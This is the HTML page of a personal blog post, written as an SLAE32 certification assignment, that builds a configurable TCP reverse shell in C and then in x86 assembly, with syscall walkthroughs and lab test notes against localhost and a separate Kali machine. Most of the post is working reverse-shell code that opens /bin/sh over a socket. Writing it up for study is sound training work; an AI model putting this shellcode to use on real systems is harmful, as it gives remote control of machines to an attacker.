@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.82.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Andrea Perfetti">
+<meta name="keywords" content="Assembly, Reverse Shell">
+<meta name="description" content="The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.">
+
+
+<meta property="og:description" content="The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE32 - Assignment 2 - TCP Reverse Shell">
+<meta name="twitter:title" content="SLAE32 - Assignment 2 - TCP Reverse Shell">
+<meta property="og:url" content="https://andrea-perfetti.github.io/2021/03/slae32-assignment-2-tcp-reverse-shell/">
+<meta property="twitter:url" content="https://andrea-perfetti.github.io/2021/03/slae32-assignment-2-tcp-reverse-shell/">
+<meta property="og:site_name" content="Andrea Perfetti">
+<meta property="og:description" content="The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.">
+<meta name="twitter:description" content="The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2021-03-14T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2021-03-14T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="SLAE Exam Assignments">
+    
+      <meta property="article:section" content="SLAE 32-bit">
+    
+  
+  
+    
+      <meta property="article:tag" content="SLAE32">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/slae/0_slae32_badge.png">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/slae/0_slae32_badge.png">
+
+
+
+
+
+  <meta property="og:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+  <meta property="twitter:image" content="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg">
+
+
+    <title>SLAE32 - Assignment 2 - TCP Reverse Shell</title>
+
+    <link rel="icon" href="https://andrea-perfetti.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-2-tcp-reverse-shell/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://andrea-perfetti.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="2">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://andrea-perfetti.github.io/">Andrea Perfetti</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://andrea-perfetti.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="2">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://andrea-perfetti.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Andrea Perfetti</h4>
+        
+          <h5 class="sidebar-profile-bio">YHQL, YLGL, YLFL.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/about/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/andrea-perfetti" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://andrea-perfetti.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="2"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      SLAE32 - Assignment 2 - TCP Reverse Shell
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-03-14T00:00:00Z">
+        
+  
+  
+  
+  
+    2021-03-14
+  
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-exam-assignments">SLAE Exam Assignments</a>, 
+    
+      <a class="category-link" href="https://andrea-perfetti.github.io/categories/slae-32-bit">SLAE 32-bit</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.</p>
+<h2 id="tcp-reverse-shell-in-c">TCP Reverse Shell in C</h2>
+<p>Let&rsquo;s first of all create a TCP reverse shell in C that listens to port 4444 on localhost. This is the code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/ip.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define REMOTE_ADDR &#34;127.0.0.1&#34;
+</span><span style="color:#75715e">#define REMOTE_PORT 4444
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> (){
+
+	<span style="color:#75715e">// Creating File Descriptor for the Socket
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> socket_fd <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#75715e">// Creating sockaddr_in structure for Remote Address
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sockaddr_in server;
+	server.sin_family <span style="color:#f92672">=</span> AF_INET;
+    	server.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(REMOTE_ADDR);
+    	server.sin_port <span style="color:#f92672">=</span> htons(REMOTE_PORT);
+
+	<span style="color:#75715e">// Connecting to the Server
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> connect(socket_fd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#66d9ef">sizeof</span>(server));
+
+	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+	{
+		<span style="color:#75715e">// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
+</span><span style="color:#75715e"></span>		dup2(socket_fd, <span style="color:#ae81ff">0</span>); 
+		dup2(socket_fd, <span style="color:#ae81ff">1</span>);
+		dup2(socket_fd, <span style="color:#ae81ff">2</span>);
+		
+		<span style="color:#75715e">// Invoking EXECVE
+</span><span style="color:#75715e"></span>		execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+
+		<span style="color:#75715e">// exit
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}<span style="color:#66d9ef">else</span>{
+		<span style="color:#66d9ef">return</span> ret;
+	}
+}
+</code></pre></div><p>Trying the shell, we see that it is working as intended:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-01.png" alt="Reverse Shell skeleton in C"></p>
+<h2 id="porting-the-c-code-to-assembly">Porting the C code to Assembly</h2>
+<p>Now, we need to port the C code into Assembly code. Basically, we need to replicate the following syscalls:</p>
+<ul>
+<li><a href="https://man7.org/linux/man-pages/man2/socket.2.html">socket</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/connect.2.html">connect</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/dup.2.html">dup2</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/execve.2.html">execve</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/exit.2.html">exit</a></li>
+</ul>
+<p>In the <code>Reverse-Shell-StaticParams.nasm</code> file the original C lines have been kept to provide references and make it more readable at a first glance.</p>
+<p>Let&rsquo;s start and set the registers to zero:</p>
+<pre><code>; Zeroing the registers	
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+</code></pre><h3 id="socket">socket()</h3>
+<p>The <code>socket()</code> function (syscall 359) creates an endpoint for communication. The prototype for this function is defined as follows:</p>
+<pre><code>int socket(int domain, int type, int protocol);
+</code></pre><p>The parameters need to be put in appropriate registers:</p>
+<ul>
+<li>ebx will contain <em>domain</em>, set to 2 for &ldquo;AF_INET&rdquo; (IPv4 Internet protocols)</li>
+<li>ecx will contain <em>type</em>, set to 1 for &ldquo;SOCK_STREAM&rdquo; (sequenced, reliable, two-way, connection-based byte streams)</li>
+<li>edx will contain <em>protocol</em>, set to 0 (single protocol)</li>
+</ul>
+<p>Code implementation is the following:</p>
+<pre><code>;// Creating File Descriptor for the Socket	
+;socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+mov ax, 0x167		; #define __NR_socket 359
+mov bl, 0x2			; AF_INET = 2
+mov cl, 0x1			; SOCK_STREAM = 1
+int 0x80			; FD will be stored in eax
+</code></pre><p>The return value of the function is the file descriptor that refers to the communication endpoint that has been created, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into edi.</p>
+<pre><code>mov edi, eax		; Copying socket_fd into edi
+xor eax, eax		; Cleaning eax
+</code></pre><h3 id="connect">connect()</h3>
+<p>The <code>connect()</code> function (syscall 362) initiates a connection on a socket. The prototype for this function is defined as follows:</p>
+<pre><code>int connect(int sockfd, const struct sockaddr *addr,
+			socklen_t addrlen);
+</code></pre><p>In order to execute the <em>connect</em> we will need to create the <em>sockaddr</em> structure in memory with information on the remote address to connect to, which will then be passed to the connect. As we will need to provide also the lenght of the structure in memory, let&rsquo;s first save the current esp into edx:</p>
+<pre><code>;// Creating sockaddr_in structure for Remote Address
+;struct sockaddr_in server;
+mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)
+</code></pre><p>We need now to push the attributes of sockaddr_in onto the stack <em>in reverse order</em>, therefore we are:</p>
+<ul>
+<li>
+<p>Pushing 8 bytes set to zero and then push the listen address 0.0.0.0 (another 4 zero bytes):</p>
+<pre><code>  ; Pushing 8 zero bytes as per struct specifications
+  push eax	
+  push eax
+</code></pre></li>
+<li>
+<p>Pushing the remote address to which the connection will be attempted. Here we could have some problems with the shellcode if at least one of the components of the IP address is zero. I have then decided to add a version of the IP address XOR-ed with 0xFFFFFFFF (it is 255.255.255.255 and it is very unlikely that someone connects to that address). Given the basic rule <code>A XOR B = C,  C XOR B = A</code> I am then XOR-ing it again in the code in order to retrieve the original IP value without writing zeroes in the shellcode.</p>
+<pre><code>  ;server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);	
+  mov eax, 0xfeffff80	; XOR-ed Address
+  xor eax, 0xFFFFFFFF		
+  push eax
+  xor eax, eax
+</code></pre></li>
+<li>
+<p>Pushing the port to bind. We are using port 4444 which is 0x115c Hex. Let&rsquo;s not forget we are using little-endian system, therefore we will push 0x5c11:</p>
+<pre><code>  ;server.sin_port = htons(REMOTE_PORT);
+  push word 0x5c11	; DEC 4444 -&gt; HEX 0x115c
+</code></pre></li>
+<li>
+<p>Pushing <em>sin_family</em> argument, which is 2 for AF_INET:</p>
+<pre><code>  ;server.sin_family = AF_INET;
+  push word 0x02		; AF_INET = 2
+</code></pre></li>
+</ul>
+<p>Now that we have created the <em>sockaddr_in</em> structure in memory we can populate the registers with parameters for the connect() syscall:</p>
+<ul>
+<li>eax is set to 0x16a (DEC 362 which is the syscall number)</li>
+<li>ebx is set with the file descriptor from socket() syscall (stored in edi)</li>
+<li>ecx is set to pointer to the structure in memory (top of the Stack)</li>
+<li>edx, which was set to the top of the stack before creating the <em>sockaddr_in</em> structure in memory, is now set to the actual size of the structure by subtracting the new address of the top of the Stack.</li>
+</ul>
+<pre><code>;/ Connecting to the Server
+;int ret = connect(socket_fd, (struct sockaddr *)&amp;server, sizeof(server));
+mov ax, 0x16a		; #define __NR_connect 362
+mov ebx, edi		; ebx = socket_fd	
+mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
+sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
+int 0x80
+</code></pre><p>After the syscall, we will have eax set to 0 if the connect() has completed successfully, otherwise eax will contain the error code.
+The code is therefore testing eax: if it is zero, the code continues; if eax is different from zero, the execution will jump to <em>_exit_error</em> label.</p>
+<pre><code>; Testing if connect() completed successfully	
+test eax, eax		; Testing if EAX is zero
+jnz _exit_error		; if eax!=0 exit with error
+</code></pre><h3 id="dup2">dup2()</h3>
+<p>The <code>dup2()</code> function (syscall 63) duplicates a file descriptor. The prototype for this function is defined as follows:</p>
+<pre><code>int dup2(int oldfd, int newfd);
+</code></pre><p>We need to execute this syscall 3 times, to duplicate the 3 file descriptors (STDIN, STDOUT and STDERR) to the file descriptor related to the connection socket created in the previous syscall and stored in esi.</p>
+<p>Given that we need to perform the same action 3 times, we are then using a loop with ecx as both counter and argument pointing to the 3 standard file descriptors:</p>
+<pre><code>	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
+	;dup2(socket_fd, 0); 
+	;dup2(socket_fd, 1);
+	;dup2(socket_fd, 2);
+
+	xor ecx, ecx		; ecx = 0
+	mov cl, 0x3			; will need to loop 3 times. 	
+_dup_loop:
+	xor eax, eax
+	mov al, 0x3f		; #define __NR_dup2 63
+	mov ebx, edi		; ebx = socket_fd
+	dec cl				; decrease ecx to get actual FD
+	int 0x80
+	jnz _dup_loop
+</code></pre><h3 id="execve">execve()</h3>
+<p>The <code>dup2()</code> function (syscall 11) executes a program. The prototype for this function is defined as follows:</p>
+<pre><code>int execve(const char *pathname, char *const argv[],
+           char *const envp[]);
+</code></pre><p>We will use it in order to start <code>/bin//sh</code> (additional &lsquo;/&rsquo; is not affecting the command, it has just been added for padding purposes), therefore we need to push it (along with NULL terminator) on the stack. Argument <em>envp</em> (edx) will be a pointer to a null dword and <em>argv</em> (ecx) will be a pointer to the address of <em>pathname</em></p>
+<pre><code>;// Invoking EXECVE
+;execve(&quot;/bin/sh&quot;, NULL, NULL);
+xor eax, eax		; eax = 0
+
+push eax		; push eax (0x0 as null terminator)
+push 0x68732f2f
+push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
+mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')
+
+push eax		; push 0x0
+mov edx, esp		; edx = pointer to TOS (null)
+
+push ebx		; push ebx (pointer to string '/bin//sh')
+mov ecx, esp		; ecx = pointer to TOS
+
+mov al, 0x0b		; #define __NR_execve 11
+int 0x80
+</code></pre><h3 id="exit">exit()</h3>
+<p>The exit function is very simple and known, its code (which needs to be set into eax) is 1. This is the code used to replicate it in our Assembly code:</p>
+<pre><code>;// exit
+;return 0;
+xor eax, eax		; eax = 0
+xor ebx, ebx		; ebx = 0
+inc eax			; eax = 1 (exit syscall)
+int 0x80
+</code></pre><h4 id="_exit_error-label">_exit_error label</h4>
+<p>If the connect() function did not succeed, the program will jump to this point and perform an exit using error code provided by the connect() function and stored in eax:</p>
+<pre><code>_exit_error:
+	;return ret;
+	mov ebx, eax		; copying error into ebx
+	xor eax, eax		; eax = 0
+	inc eax				; eax = 1 (exit syscall)
+	int 0x80
+</code></pre><h3 id="test-run">Test run</h3>
+<p>The Assembly code has been compiled and executed; it worked as intended!
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-02.png" alt="Reverse Shell skeleton in Assembly"></p>
+<p>Testing it with the error scenario (e.g. opening a listener on the wrong port) the program does not crash but exits with error (#145, in the screenshot) as intended:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-03.png" alt="Reverse Shell skeleton in Assembly - error scenario"></p>
+<h2 id="ip-and-port-configuration-utility">IP and Port configuration utility</h2>
+<p>As of now, the connection IP address and port have been hardcoded into the code, but the assignment asks for a configurable shellcode, therefore I have created a small Python3 script which generates the complete shellcode.</p>
+<p>I have generated the shellcode from the compiled nasm file and divided it into two parts (the shellcode before port bytes and the shellcode after port bytes). The <code>Reverse-Shell-Creator.py</code> Python script requires 2 parameters: the connection IP and port. It then transforms them in the appropriate format and then prints on the screen:</p>
+<ul>
+<li>selected IP address and related format for the shellcode</li>
+<li>selected port and related format for the shellcode</li>
+<li>the complete shellcode</li>
+</ul>
+<p><img src="https://andrea-perfetti.github.io/img/slae/slae2-04.png" alt="Reverse shell - PoC 1 - Step 1"></p>
+<p>In order to test the script, I have first loaded the generated shellcode generated in the image above (connection to localhost on port 8081) into a copy of the encrypter utility from Assignment 7 and encrypted it with password &lsquo;testme&rsquo;:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-05.png" alt="Reverse shell - PoC 1 - Step 2"></p>
+<p>The encrypted string has been copied to the decrypt-exec utility and then executed. As shown in the screenshot, the shell has executed successfully:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-06.png" alt="Reverse shell - PoC 1 - Step 3"></p>
+<p>I have then run another PoC (files in <code>Assignment-2/PoC/Another_PoC</code>) to test connection to another machine (a separate Kali box on my computer):</p>
+<ul>
+<li>Screenshot on the <em>target</em> machine:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-07.png" alt="Reverse shell - PoC 2 - Target machine"></li>
+<li>Screenshot on the <em>attacker</em> machine:
+<img src="https://andrea-perfetti.github.io/img/slae/slae2-08.png" alt="Reverse shell - PoC 2 - Attacker machine"></li>
+</ul>
+<!-- raw HTML omitted -->
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>.</p>
+<p><strong>Student ID</strong>: <code>SLAE - 1547</code><br>
+<strong>GitHub repository</strong>: <a href="https://github.com/andrea-perfetti/SLAE32-Exam">https://github.com/andrea-perfetti/SLAE32-Exam</a></p>
+<p>This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ uname -a 
+Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
+</code></pre>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://andrea-perfetti.github.io/tags/slae32/">SLAE32</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-1-tcp-bind-shell/" data-tooltip="SLAE32 - Assignment 1 - TCP Bind Shell">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-5-analysis/" data-tooltip="SLAE32 - Assignment 5 - Analysis">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Andrea Perfetti. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+        <div class="post-actions-wrap">
+  
+      <nav style="visibility: hidden">
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-1-tcp-bind-shell/" data-tooltip="SLAE32 - Assignment 1 - TCP Bind Shell">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://andrea-perfetti.github.io/2021/03/slae32-assignment-5-analysis/" data-tooltip="SLAE32 - Assignment 5 - Analysis">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://andrea-perfetti.github.io/img/me/me_bgWhite.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Andrea Perfetti</h4>
+    
+      <div id="about-card-bio">YHQL, YLGL, YLFL.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        IT Security Specialist
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Italy
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://andrea-perfetti.github.io/img/wallpa/pexels-elijah-o%27donnell-3473569.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://andrea-perfetti.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
